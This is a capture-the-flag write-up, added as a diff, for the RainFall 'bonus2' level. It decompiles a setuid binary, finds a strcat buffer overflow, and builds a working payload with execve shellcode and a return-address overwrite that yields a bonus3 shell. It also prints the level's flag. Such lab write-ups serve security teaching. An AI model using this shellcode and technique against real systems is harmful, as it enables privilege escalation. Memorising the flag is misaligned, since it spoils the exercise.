@@ -1,0 +1,223 @@
+# Bonus 2
+
+## General Informations 
+
+**Path** : `/home/user/bonus2/bonus2` </br>
+**File** : 
+```
+bonus2: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf71cccc3c27dfb47071bb0bc981e2dae92a47844, not stripped
+```
+**Permissions**: `-rwsr-s---+ 1 bonus3 users 5664 Mar  6  2016 bonus2`
+
+## Static Analysis
+
+After decompiling the binary in ghidra, we get the pseudo code below: 
+
+```
+void greetuser(void)
+{
+  char local_4c [4];
+  undefined4 local_48;
+  char buff [64];
+  
+  if (language == 1) {
+    local_4c[0] = 'H';
+    local_4c[1] = 'y';
+    local_4c[2] = 'v';
+    local_4c[3] = -0x3d;
+    local_48._0_1_ = -0x5c;
+    local_48._1_1_ = -0x3d;
+    local_48._2_1_ = -0x5c;
+    local_48._3_1_ = ' ';
+    builtin_strncpy(buff,"päivää ",0xb);
+  }
+  else if (language == 2) {
+    builtin_strncpy(local_4c,"Goed",4);
+    local_48._0_1_ = 'e';
+    local_48._1_1_ = 'm';
+    local_48._2_1_ = 'i';
+    local_48._3_1_ = 'd';
+    builtin_strncpy(buff,"dag!",4);
+    buff[4] = ' ';
+    buff[5] = '\0';
+  }
+  else if (language == 0) {
+    builtin_strncpy(local_4c,"Hell",4);
+    local_48._0_3_ = 0x206f;
+  }
+  strcat(local_4c,&stack0x00000004);
+  puts(local_4c);
+  return;
+}
+
+undefined4 main(int param_1,int param_2)
+{
+  undefined4 uVar1;
+  int iVar2;
+  char *pcVar3;
+  undefined4 *puVar4;
+  byte bVar5;
+  char buff1 [40];
+  char buff2 [36];
+  char *lang;
+  
+  bVar5 = 0;
+  if (param_1 == 3) {
+    pcVar3 = buff1;
+    for (iVar2 = 0x13; iVar2 != 0; iVar2 = iVar2 + -1) {
+      pcVar3[0] = '\0';
+      pcVar3[1] = '\0';
+      pcVar3[2] = '\0';
+      pcVar3[3] = '\0';
+      pcVar3 = pcVar3 + 4;
+    }
+    strncpy(buff1,*(char **)(param_2 + 4),0x28);
+    strncpy(buff2,*(char **)(param_2 + 8),0x20);
+    lang = getenv("LANG");
+    if (lang != (char *)0x0) {
+      iVar2 = memcmp(lang,&DAT_0804873d,2);
+      if (iVar2 == 0) {
+        language = 1;
+      }
+      else {
+        iVar2 = memcmp(lang,&DAT_08048740,2);
+        if (iVar2 == 0) {
+          language = 2;
+        }
+      }
+    }
+    pcVar3 = buff1;
+    puVar4 = (undefined4 *)&stack0xffffff50;
+    for (iVar2 = 0x13; iVar2 != 0; iVar2 = iVar2 + -1) {
+      *puVar4 = *(undefined4 *)pcVar3;
+      pcVar3 = pcVar3 + ((uint)bVar5 * -2 + 1) * 4;
+      puVar4 = puVar4 + (uint)bVar5 * -2 + 1;
+    }
+    uVar1 = greetuser();
+  }
+  else {
+    uVar1 = 1;
+  }
+  return uVar1;
+}
+```
+
+`main`
+  - Expects two arguments
+  - Initializes two buffers to zero
+  - Copies the first argument into `local_60[40]` and the second into `acStack_38[36]`
+  - Checks if the environment variable `LANG` exists; if it does, it compares its value to `fi` or `nl` and sets the lang variable accordingly
+  - Then calls `greetuser` with the `lang` variable
+- `greetuser` displays “Hello” translated in either *Finnish* or *Netherlands* depending on the `lang` value.
+This function uses a 64 bytes buffer to store the *greeting message*, which is later concatenated with the 2 buffers from main. This is interesting because the two input buffers already occupy 72 bytes, which exceeds the buffer size and leads to a buffer overflow when `strcat` is called.
+
+
+## Vulnerability found 
+
+The vulnerability lies in the `strcat` call inside `greetuser`.
+
+As explained in the static analysis, `strcat` concatenates a greeting string with the 2 input buffers.
+Since the buffers alone total 72 bytes, they already overflow the 64-byte greeting buffer.
+
+It gets even worse if we set the environment variable `LANG=fi`, which changes the greeting to `Hyvää päivää ` — a longer string than `Hello ` — thus overwriting even more data on the stack.
+
+## Dynamic Analysis
+
+Let’s begin by filling both buffers. </br>
+We unset GDB’s `LINES` and `COLUMNS` environment variables and set two breakpoints: one before and one after the `strcat` call.
+```
+(gdb) unset env LINES
+(gdb) unset env COLUMNS
+(gdb) b *0x08048517
+(gdb) b *0x0804851c
+(gdb) r `python -c 'print "A"*40'`  `python -c 'print "B"*32'`
+...
+Program received signal SIGSEGV, Segmentation fault.
+0x08004242 in ?? ()
+``` 
+
+As expected, the program segfaults. We can see that the last two bytes of the second buffer have overwritten the return address of `greetuser`. </br>
+Now let’s test it with the environment variable set to `LANG=fi`:
+```
+(gdb) set env LANG=fi
+(gdb) r `python -c 'print "A"*40'`  `python -c 'print "B"*32'`
+...
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+```
+
+This time, the entire return address is overwritten. That’s because the `Hyvää päivää ` greeting is longer than `Hello `, which results in more data being copied into the overflowing buffer. </br>
+
+We’ll now craft a specific payload in the second argument to determine the offset to the return address.
+```
+(gdb) r `python -c 'print "A"*40'`  `python -c 'print "AAAABBBBCCCCDDDDEEEEFFFFGGGGG"'`
+...
+0x46464545 in ?? ()
+```
+
+We observe that the return address begins with `EEFF`, which appears at the 18th character.
+We can now overwrite the return address with a pointer to the first argument, which we’ll fill with `SIGTRAP` instructions (`0xCC`).
+```
+(gdb) x/50w $esp 
+...
+0xbffff5a0:	0xcccccccc	0xcccccccc	0xcccccccc	0xcccccccc
+...
+(gdb) r `python -c 'print "\xCC"*40'`  `python -c 'print "AAAABBBBCCCCDDDDEE" + "\xa0\xf5\xff\xbf" + "FFGGGGG"'`
+...
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0xbffff5a1 in ?? ()
+```
+
+Great — it works as expected. The return address wasn’t exactly what we aimed for (`0xbffff5a0 → 0xbffff5a1`), but it's close enough to proceed. </br>
+Now we replace the trap instructions with a shellcode of 21 bytes: `"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"`
+```
+(gdb) r `python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\xCC"*(40-21)'`  `python -c 'print "AAAABBBBCCCCDDDDEE" + "\xa0\xf5\xff\xbf" + "FFGGGGG"'`
+...
+process 2942 is executing new program: /bin/dash
+```
+
+It works inside GDB. Now let’s try it outside:
+```
+bonus2@RainFall:~$ LANG=fi ./bonus2 `python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\xCC"*(40-21)'`  `python -c 'print "AAAABBBBCCCCDDDDEE" + "\xa0\xf5\xff\xbf" + "FFGGGGG"'`
+...
+Segmentation fault (core dumped)
+```
+
+Ok, it doesn't work ... But remember: if it works in GDB but not in the terminal, the problem is often a small offset difference, due to variations in environment memory layout. </br> 
+After testing nearby addresses, we find that `0xbffff5b0` works.
+
+```
+bonus2@RainFall:~$ LANG=fi ./bonus2 `python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\xCC"*(40-21)'`  `python -c 'print "AAAABBBBCCCCDDDDEE" + "\xb0\xf5\xff\xbf" + "FFGGGGG"'`
+Hyvää päivää 1���
+                 Qh//shh/bin��̀�������������������AAAABBBBCCCCDDDDEE����FFGGGGG
+$ whoami
+bonus3
+```
+
+
+## Payload construction 
+
+We fill the first buffer and replacing the first 21 bytes with a shellcode:
+```
+`python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\xCC"*(40-21)'`
+```
+We calculate the correct offset to the return address and overwrite it with a pointer to the shellcode in the first buffer:
+```
+`python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\xCC"*(40-21)'`  `python -c 'print "AAAABBBBCCCCDDDDEE" + "\xb0\xf5\xff\xbf" + "FFGGGGG"'`
+```
+
+## Demonstration 
+
+```
+bonus2@RainFall:~$ LANG=fi ./bonus2 `python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\xCC"*(40-21)'`  `python -c 'print "AAAABBBBCCCCDDDDEE" + "\xb0\xf5\xff\xbf" + "FFGGGGG"'`
+Hyvää päivää 1���
+                 Qh//shh/bin��̀�������������������AAAABBBBCCCCDDDDEE����FFGGGGG
+$ whoami
+bonus3
+```
+
+## Flag 
+
+```
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+```
